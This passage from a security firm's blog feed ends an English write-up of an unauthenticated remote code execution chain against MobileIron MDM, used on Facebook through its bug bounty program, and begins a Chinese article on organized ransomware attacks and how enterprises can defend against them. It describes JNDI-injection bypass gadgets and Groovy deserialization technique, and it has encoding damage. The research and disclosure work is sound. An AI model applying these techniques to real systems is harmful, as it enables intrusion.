&lt;/ul&gt;

&lt;p&gt;In our environment, we could only trigger the Spring AOP gadget chain and get a JNDI Injection.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;¬†&lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;‚àö&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Injection&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have a JNDI Injection, the rest parts of exploitations are easy! We can just leverage &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Mu√±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt;‚Äôs work, &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt;, from Black Hat USA 2016 to get the code execution‚Ä¶ Is that true?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Mu√±oz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; introduced this on Black Hat, we could say that this technique helps countless security researchers and brings Java deserialization vulnerability into a new era. However, Java finally mitigated the last JNDI/LDAP puzzle in &lt;a href=&quot;https://www.oracle.com/java/technologies/javase/8u181-relnotes.html&quot;&gt;October 2018&lt;/a&gt;. After that, all java version higher than 8u181, 7u191, and 6u201 can no longer get code execution through JNDI remote URL-Class loading. Therefore, if we exploit the Hessian deserialization on the latest MobileIron, we must face this problem!&lt;/p&gt;

&lt;p&gt;Java changed the default value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; to prevent attackers from downloading remote URL-Class to get code executions. But only this has been prohibited. We can still manipulate the JNDI and redirect the Naming Reference to a local Java Class!&lt;/p&gt;

&lt;p&gt;The concept is a little bit similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt;, utilizing a local existing Java Class to do further exploitations. You can refer to the article &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; in early 2019 for details. It describes the attack on POST-JNDI exploitations and how to abuse the Tomcat‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; to populate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; gadget to get code execution. Based on this concept, researcher &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; also provides another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; gadget on Groovy. As described in &lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;his (Chinese) article&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Èô§‰∫Ü javax.el.ELProcessorÔºåÂΩìÁÑ∂‰πüËøòÊúâÂæàÂ§öÂÖ∂‰ªñÁöÑÁ±ªÁ¨¶ÂêàÊù°‰ª∂ÂèØ‰ª•‰Ωú‰∏∫ beanClass Ê≥®ÂÖ•Âà∞ BeanFactory ‰∏≠ÂÆûÁé∞Âà©Áî®„ÄÇ‰∏æ‰∏™‰æãÂ≠êÔºåÂ¶ÇÊûúÁõÆÊ†áÊú∫Âô® classpath ‰∏≠Êúâ groovy ÁöÑÂ∫ìÔºåÂàôÂèØ‰ª•ÁªìÂêà‰πãÂâç Orange Â∏àÂÇÖÂèëËøáÁöÑ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins ÁöÑÊºèÊ¥ûÂÆûÁé∞Âà©Áî®&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;It seems the Meta Programming exploitation in my previous Jenkins research could be used here as well. It makes the Meta Programming great again :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The approach is fantastic and looks feasible for us. But both gadgets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; are unavailable due to our outdated target libraries. Tomcat introduced the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; since 8.5, but our target is 7. As for the Groovy gadget, the target Groovy version is too old (1.5.6 from 2008) to support the Meta Programming, so we still have to find a new gadget by ourselves. We found a new gadget on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; in the end. If you are interested, you can check the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt; I sent to the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; project!&lt;/p&gt;

&lt;h2 id=&quot;attacking-facebook&quot;&gt;Attacking Facebook&lt;/h2&gt;

&lt;p&gt;Now we have a perfect RCE by chaining JNDI Injection, Tomcat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt;. It‚Äôs time to hack Facebook!&lt;/p&gt;

&lt;p&gt;Aforementioned, we knew the Facebook uses MobileIron since 2016. Although the server‚Äôs index responses 403 Forbidden now, the Web Service is still accessible!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everything is ready and wait for our exploit! However, several days before our scheduled attack, we realized that there is a critical problem in our exploit. From &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;our last time popping shell on Facebook&lt;/a&gt;, we noticed it blocks outbound connections due to security concerns. The outbound connection is vital for JNDI Injection because the idea is to make victims connecting to a malicious server to do further exploitations. But now, we can‚Äôt even make an outbound connection, not to mention others.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;So far, all attack surfaces on JNDI Injection have been closed, we have no choice but to return to Hessian deserialization. But due to the lack of available gadgets, we must discover a new one by ourselves!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discovering a new gadget, we have to understand the existing gadgets‚Äô root cause properly. After re-reading Moritz Bechler‚Äôs &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;paper&lt;/a&gt;, a certain word interested me:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy‚Äôs MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A question quickly came up in my mind: Why did the author leave this word here? Although it failed with exceptions, there must have been something special so that the author write this down.&lt;/p&gt;

&lt;p&gt;Our target is running with a very old Groovy, so we are guessing that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; constrain might not have been applied to the code base yet! We compared the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; between the latest and 1.5.6.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, we are right. There is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; in Groovy 1.5.6, and we later learned &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; is just for that. It‚Äôs a mitigation for the rising Java deserialization vulnerability in 2015. Since Groovy is an internally used library, developers won‚Äôt update it if there is no emergency. The outdated Groovy could also be a good case study to demonstrated how a harmless component can leave you compromised!&lt;/p&gt;

&lt;p&gt;Of course we got the shell on Facebook in the end. Here is the video:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;vulnerability-report-and-patch&quot;&gt;Vulnerability Report and Patch&lt;/h2&gt;

&lt;p&gt;We have done all the research on March and sent the advisory to MobileIron at 4/3. The MobileIron released the patch on 6/15 and addressed three CVEs for that. You can check the &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;official website&lt;/a&gt; for details!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the patch has been released, we start monitoring the Internet to track the overall fixing progress. Here we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; header on static files so that the result is just for your information. (Unknown stands for the server closed both 443 and 8443 ports)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, we keep our attentions on Facebook as well. With 15 days no-patch confirm, we finally popped a shell and report to their Bug Bounty program at 7/2!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, we have demonstrated a completely unauthenticated RCE on MobileIron. From how we get the firmware, find the vulnerability, and bypass the JNDI mitigation and network limitation. There are other stories, but due to the time, we have just listed topics here for those who are interested:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to take over the employees‚Äô devices from MDM&lt;/li&gt;
  &lt;li&gt;Disassemble the MI Protocol&lt;/li&gt;
  &lt;li&gt;And the CVE-2020-15506, an interesting authentication bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article could draw attention to MDM and the importance of enterprise security! Thanks for reading. :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Êïµ‰∫∫‰∏çÊòØÂãíË¥ñËªüÈ´îÔºåËÄåÊòØÁµÑÁπîÂûãÈß≠ÂÆ¢</title>
                <description>&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;Èß≠ÂÆ¢ÊîªÊìä‰∫ã‰ª∂‰∏ÄÁõ¥Â≠òÂú®ÊñºÁúüÂØ¶‰∏ñÁïåÔºåÂè™ÊòØÈÆÆÂ∞ëË¢´ÂÆåÊï¥ÂÖ¨ÈñãÊè≠Èú≤„ÄÇ‰ªäÂπ¥ÂúãÂÖß‰∏Ä‰∫õÈáçÂ§ßÈóúÈçµÂü∫Á§éË®≠ÊñΩ (Critical Information Infrastructure ProtectionÔºåCIIP) ‰ª•ÂèäÂúãÂÖßÁöÑË∑®Âúã‰ºÅÊ•≠Á¥õÁ¥õÁôºÁîüÂö¥ÈáçÁöÑË≥áÂÆâ‰∫ã‰ª∂ÔºåÊàëÂÄëÊÉ≥Á∞°ÂñÆÁöÑË∑üÂ§ßÂÆ∂Ë´áË´áÈÄô‰∫õ‰∫ã‰ª∂ËÉåÂæå‰ºÅÊ•≠ÁúüÊ≠£ÈúÄË¶ÅÊÄùËÄÉÂèäÈáçË¶ñÁöÑÊ†∏ÂøÉÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;‰ºÅÊ•≠Èù¢Â∞çÁöÑÊòØÁµÑÁπîÂûãÈß≠ÂÆ¢ËÄå‰∏çÂè™ÊòØÂãíË¥ñËªüÈ´î&quot;&gt;‰ºÅÊ•≠Èù¢Â∞çÁöÑÊòØÁµÑÁπîÂûãÈß≠ÂÆ¢ËÄå‰∏çÂè™ÊòØÂãíË¥ñËªüÈ´î&lt;/h2&gt;

&lt;p&gt;‰∏çÁü•ÈÅìÊòØÂõ†ÁÇ∫ÂãíË¥ñËªüÈ´îÊØîËºÉÂê∏ÁùõÈÇÑÊòØ‰ªÄÈ∫ºÁ∑£ÊïÖÔºåÂ™íÈ´îÊØîËºÉÂñúÊ≠°Áî®ÂãíË¥ñËªüÈ´î‰ΩúÁÇ∫Ê®ôÈ°åÂëàÁèæËøëÂπ¥‰ºÅÊ•≠Èù¢Ëá®ÁöÑÈáçÂ§ßÂ®ÅËÑÖ„ÄÇÂØ¶Èöõ‰∏äÔºåÂãíË¥ñËªüÈ´îÂè™ÊòØÊîªÊìäÈÅéÁ®ãÁöÑÂ∑•ÂÖ∑„ÄÅÂä†ÂØÜÂè™ÊòØÂãíË¥ñÁöÑÊâãÊÆµ‰πã‰∏ÄÔºåÁîöËá≥ÂåÖÂê´Á´äÂèñÊ©üÊïèË≥áÊñô„ÄÇÂõ†ÁÇ∫ÈÄô‰∫õ‰∫ã‰ª∂ÊàëÂÄëÊ≤íÊúâÂèÉËàáË™øÊü•ÊàñÁõ∏ÈóúÁöÑÊ¥ªÂãïÔºåÊàëÂÄëÂÉÖÂ∞±Â∑≤ÂÖ¨ÈñãÊè≠Èú≤ÁöÑË≥áÊñô‰æÜ‰∏ÄÁ™∫Èù¢Â∞çÈÄôÊ®£ÁöÑÂ®ÅËÑÖÔºå‰ºÅÊ•≠ÁöÑÂÖ∑È´îÂÅöÊ≥ïÊúâÂì™‰∫õÔºü&lt;/p&gt;

&lt;p&gt;Ê†πÊìöÊ≥ïÂãôÈÉ®Ë™øÊü•Â±ÄÂú® iThome 2020 Ë≥áÂÆâÂ§ßÊúÉÁöÑ&lt;a href=&quot;https://www.ithome.com.tw/news/139331&quot;&gt;ÂàÜ‰∫´&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Âú®ÈÄôËµ∑ÊîªÊìä‰∫ã‰ª∂‰∏≠ÔºåÈß≠ÂÆ¢È¶ñÂÖàÂæû Web ‰º∫ÊúçÂô®„ÄÅÂì°Â∑•ÈõªËÖ¶Á≠âÈÄîÂæëÔºåÂÖ•‰æµÂÖ¨Âè∏Á≥ªÁµ±Èï∑ÊúüÊΩõ‰ºèÂèäÊé¢Ê∏¨ÔºåËÄåÂæåÁ´äÂèñÂ∏≥ËôüÊ¨äÈôêÔºåÈÄ≤ÂÖ• AD ‰º∫ÊúçÂô®ÔºåÂà©Áî®ÂáåÊô®ÊôÇÊÆµÁ´ÑÊîπÁæ§ÁµÑÊ¥æÈÄÅÂéüÂâáÔºàGPOÔºâÔºåÂêåÊôÇÈ†êÂüã lc.tmp ÊÉ°ÊÑèÁ®ãÂºèÂà∞ÂÖßÈÉ®‰º∫ÊúçÂô®‰∏≠ÔºåÁ≠âÂà∞Âì°Â∑•‰∏äÁè≠ÊâìÈñãÈõªËÖ¶ÂæåÔºåÈõªËÖ¶Á´ãÂç≥Â•óÁî®ÈÅ≠Á´ÑÊîπÁöÑ GPOÔºå‰æùÊìöÊåá‰ª§Â∞±ÊúÉËá™ÂãïÂ∞áÂãíÁ¥¢ËªüÈ´îËºâÂà∞Ë®òÊÜ∂È´î‰∏≠‰æÜÂü∑Ë°å„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‰ºÅÊ•≠Âú®Ë¢´ÂãíË¥ñËªüÈ´îÂä†ÂØÜÂæåÔºåÂæÄÂæÄÁ¨¨‰∏ÄÊôÇÈñìÂÆπÊòìÁõ¥Ë¶∫ÊÉ≥Âà∞Èò≤ÊØíËªüÈ´îÊàñÁ´ØÈªûÈò≤Ë≠∑Ë®≠ÂÇôÁÇ∫‰ΩïÊ≤íÊúâÁîüÊïàÔºüÁèæÂØ¶ÊòØÔºåÂ¶ÇÊûú‰ºÅÊ•≠Èù¢Â∞çÁöÑÊòØÈáùÂ∞çÂºèÁöÑÊîªÊìäÔºàAdvanced Persistent ThreatÔºåAPTÔºâÔºåÊîªÊìäËÄÖÂã¢ÂøÖÊúÉÁ†îÁ©∂ÂèØ‰ª•ÁπûÈÅé‰ºÅÊ•≠ÁöÑÈò≤Ë≠∑ÊàñÁõ£ÊéßÁöÑÊñπÂºè„ÄÇÊâÄ‰ª•‰ºÅÊ•≠Ë¶ÅÊÄùËÄÉÁöÑÊáâË©≤ÊòØ‰∏ÄÂÄãÈò≤Á¶¶Êà∞Á∑öÊàñÊõ¥ÁÇ∫ÂÖ®Èù¢ÁöÑÈò≤Ë≠∑Á≠ñÁï•ÔºåËÄåÈùû‰ª∞Ë≥¥ÂñÆ‰∏ÄÁöÑË≥áÂÆâË®≠ÂÇôÊàñÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;Âæû‰∏äËø∞ÁöÑÊïòËø∞ÔºåÊàëÂÄëÂèØ‰ª•ÁôºÁèæÂπæÂÄãÂïèÈ°åÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Web ‰º∫ÊúçÂô®ÂÖ∑ÊúâÂèØÂà©Áî®ÁöÑÊºèÊ¥û&lt;/strong&gt;ÔºåËÄåÈÄôÂÄãÊºèÊ¥ûÂèØËÉΩÂ∞éËá¥‰∏ªÊ©üË¢´ÂèñÂæóÊ¨äÈôêÈÄ≤Ë°åÂæåÁ∫åÁöÑÊ©´ÂêëÁßªÂãï„ÄÇÈÄ†ÊàêÈÄôÂÄãÂïèÈ°åÁöÑÂéüÂõ†ÂèØËÉΩÂåÖÂê´Ôºö
    &lt;ul&gt;
      &lt;li&gt;Á≥ªÁµ±ÂæûÊú™ÈÄ≤Ë°åÈ´òÂº∑Â∫¶ÁöÑÊª≤ÈÄèÊ∏¨Ë©¶ÂèäÂÆöÊúüÂü∑Ë°åÂº±ÈªûÊéÉÊèè&lt;/li&gt;
      &lt;li&gt;Â±¨ÊñºËÄÅËàäÁÑ°Ê≥ï‰øÆË£úÁöÑÁ≥ªÁµ±Ôºà‰ΩøÁî®ËÄÅËàäÁöÑÊ°ÜÊû∂„ÄÅÁ®ãÂºèË™ûË®ÄÔºâÊàñÊòØÂª†ÂïÜÂ∑≤Á∂ì‰∏çÂÜçÁ∂≠Ë≠∑&lt;/li&gt;
      &lt;li&gt;‰∏ÄÊ¨°ÊÄßÁöÑÊ¥ªÂãïÁ∂≤Á´ôÊàñÊ∏¨Ë©¶Á∂≤Á´ôÔºåÊ¥ªÂãïÊàñÊ∏¨Ë©¶ÁµêÊùüÂæåÊú™‰æùÁÖßÁ®ãÂ∫è‰∏ãÁ∑öÔºåÊàêÁÇ∫‰ºÅÊ•≠Èò≤Á¶¶Á†¥Âè£&lt;/li&gt;
      &lt;li&gt;‰∏çÂú®‰ºÅÊ•≠Áõ§ÈªûÁöÑÈò≤Ë≠∑ÁØÑÂúçÂÖßÔºàÂ¶ÇÂâçÁ´ØÊú™Ë®≠ÁΩÆ WAFÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÂæûÂì°Â∑•ÈõªËÖ¶ÊàñÊòØ Web ‰º∫ÊúçÂô®ÂèØ‰ª•ÈÄêÊ≠•Ë∑≥Âà∞ AD ‰º∫ÊúçÂô®&lt;/strong&gt;ÔºåÂèØËÉΩÂ≠òÂú®ÁöÑÂïèÈ°åÂâáÂåÖÂê´Ôºö
    &lt;ul&gt;
      &lt;li&gt;Á∂≤Ë∑ØÈñìÁöÑÂçÄÈöî‰∏çÂö¥Ë¨πÔºå‰æãÂ¶ÇÊú™‰æùÁÖßË≥áÊñôÊàñÁ≥ªÁµ±ÁöÑÈáçË¶ÅÊÄßÈÄ≤Ë°åÂçÄÈöî&lt;/li&gt;
      &lt;li&gt;ÂêåÁ∂≤ÊÆµ‰º∫ÊúçÂô®ÈñìÁöÑÈÄöË®äÊñπÂºèÁÆ°Êéß‰∏çÁï∂ÔºåÊ≤íÊúâÈñãÂïüÊàñÁÆ°Âà∂ÈáçË¶Å‰º∫ÊúçÂô®ÁöÑÈÄöË®äÂü†ÊàñÈôêÂà∂‰æÜÊ∫ê IP ‰ΩçÂùÄ&lt;/li&gt;
      &lt;li&gt;Á≥ªÁµ±Â≠òÂú®ÂèØÂà©Áî®ÂèñÂæóÊ¨äÈôêÁöÑÂº±Èªû&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Âà©Áî®ÂáåÊô®ÊôÇÊÆµÁ´ÑÊîπÁæ§ÁµÑÊ¥æÈÄÅÂéüÂâá&lt;/strong&gt;ÔºöÊúÄÂæåÊòØÂõûÊáâÊ©üÂà∂Êú™Âç≥ÊôÇÔºàÂåÖÂê´‰∫∫Âì°Êé•Áç≤ÂëäË≠¶ÂæåËôïÁêÜ‰∏çÁï∂ÔºâÔºå‰ºÅÊ•≠Â∞çÊñºÂÖ∑ÊúâÈõÜ‰∏≠ÁÆ°ÁêÜÊ¨äÈôêÁöÑÈáçË¶ÅÁ≥ªÁµ±Ôºå‰æãÂ¶Ç AD Server„ÄÅË≥áÁî¢ÁÆ°ÁêÜËªüÈ´îÁ≠âÈÄôÈ°ûÂûãÁöÑ‰∏ªÊ©üÔºåÈô§‰∫ÜÂ∞çÁâπÊ¨äÂ∏≥ËôüÈ´òÂº∑Â∫¶ÁöÑÁÆ°ÁêÜÂ§ñÔºàÂ¶Ç OTPÔºâÔºå‰πüÊáâË©≤ÈáùÂ∞ç„ÄåÁï∞Â∏∏Â∏≥ËôüÁôªÂÖ•„Äç„ÄÅ„ÄåÁï∞Â∏∏Â∏≥ËôüÊñ∞Â¢ûÂà∞Áæ§ÁµÑ„Äç„ÄÅ„ÄåÊ≠£Â∏∏Â∏≥ËôüÁï∞Â∏∏ÁôªÂÖ•ÊôÇÈñì„Äç„ÄÅ„ÄåÊñ∞Â¢ûÊéíÁ®ãÊàñ GPO„ÄçÁ≠âË°åÁÇ∫ÁôºÂá∫ÂëäË≠¶ÔºõËÄåÂêÑÁ®ÆÂëäË≠¶‰πüÊáâË©≤‰æùÁÖßË≥áÁî¢ÁöÑÈáçË¶ÅÊÄßË®ÇÂÆö‰∏çÂêåÁöÑ SLA ÂõûÊáâËàáËôïÁêÜ„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;‰Ω†ÈúÄË¶ÅÊõ¥ÂÖ®Èù¢ÁõÆÊ®ôÂ∞éÂêëÁöÑÊñπÂºèÊÄùËÄÉ‰ºÅÊ•≠Ë≥áÂÆâÁèæÊ≥Å&quot;&gt;‰Ω†ÈúÄË¶ÅÊõ¥ÂÖ®Èù¢„ÄÅÁõÆÊ®ôÂ∞éÂêëÁöÑÊñπÂºèÊÄùËÄÉ‰ºÅÊ•≠Ë≥áÂÆâÁèæÊ≥Å&lt;/h2&gt;

